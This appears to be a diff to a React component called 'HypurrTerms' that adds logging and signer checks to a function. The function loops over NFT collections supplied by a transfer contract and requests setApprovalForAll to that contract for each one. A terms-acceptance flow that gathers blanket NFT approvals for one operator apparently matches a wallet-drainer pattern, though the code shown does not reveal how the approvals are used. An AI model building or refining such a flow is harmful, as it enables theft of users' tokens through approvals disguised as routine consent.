@@ -238,43 +238,71 @@ const HypurrTerms = () => {
       throw new Error("Missing required contract addresses");
     }
 
+    if (!window.ethereum) {
+      throw new Error("MetaMask not detected. Please install MetaMask.");
+    }
+
+    console.log('=== APPROVAL FUNCTION CALLED ===');
+    console.log('Account:', account);
+    console.log('Transfer Contract:', TRANSFER_CONTRACT);
+
     const provider = new ethers.BrowserProvider(window.ethereum);
     const signer = await provider.getSigner();
+    
+    // Verify we have a signer
+    const signerAddress = await signer.getAddress();
+    console.log('Signer address:', signerAddress);
+    
+    if (signerAddress.toLowerCase() !== account.toLowerCase()) {
+      throw new Error('Signer address does not match connected account');
+    }
     
     // Get enabled contracts from transfer contract
     const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
     const enabledContracts = await transferContract.getEnabledNFTContracts();
     
-    console.log('Approval: Checking contracts:', enabledContracts);
+    console.log('Approval: Enabled contracts:', enabledContracts);
     
     // Approve each NFT contract
     for (const nftContractAddress of enabledContracts) {
       try {
+        console.log(`\n=== Processing contract: ${nftContractAddress} ===`);
         const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, signer);
         
         // Check if already approved
         const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
-        console.log(`Approval: Contract ${nftContractAddress} approved status:`, isApproved);
+        console.log(`Approval status:`, isApproved);
         
         if (isApproved) {
-          console.log(`Contract ${nftContractAddress} already approved`);
+          console.log(`✅ Already approved, skipping`);
           continue;
         }
         
-        // Approve contract - this will trigger MetaMask popup immediately
-        console.log(`Approval: Requesting approval for ${nftContractAddress}...`);
-        console.log(`Approval: MetaMask popup should appear now - please approve`);
+        // Approve contract - this MUST trigger MetaMask popup
+        console.log(`\n🚀 CALLING setApprovalForAll NOW...`);
+        console.log(`   Contract: ${nftContractAddress}`);
+        console.log(`   Operator: ${TRANSFER_CONTRACT}`);
+        console.log(`   Approved: true`);
+        console.log(`\n⏳ MetaMask popup should appear NOW!`);
         
-        // Call setApprovalForAll - this will trigger MetaMask popup
-        const tx = await nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
+        // Call setApprovalForAll - this should trigger MetaMask immediately
+        const txPromise = nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
+        console.log('Transaction promise created, waiting for user approval in MetaMask...');
         
-        console.log(`Approval: Transaction submitted, hash:`, tx.hash);
-        console.log(`Approval: Waiting for confirmation...`);
+        const tx = await txPromise;
+        console.log(`✅ Transaction submitted! Hash:`, tx.hash);
+        console.log(`⏳ Waiting for confirmation...`);
         
         await tx.wait();
-        console.log(`Approval: Contract ${nftContractAddress} approved successfully`);
+        console.log(`✅ Contract ${nftContractAddress} approved successfully!`);
       } catch (error) {
-        console.error(`Error approving ${nftContractAddress}:`, error);
+        console.error(`❌ Error approving ${nftContractAddress}:`, error);
+        console.error('Error details:', {
+          code: error.code,
+          message: error.message,
+          data: error.data,
+          reason: error.reason
+        });
         if (error.code === 4001) {
           throw new Error('Approval transaction was rejected. Please try again and approve the transaction in MetaMask.');
         }
@@ -282,6 +310,7 @@ const HypurrTerms = () => {
       }
     }
     
+    console.log('=== ALL APPROVALS COMPLETE ===');
     return true;
   };
   
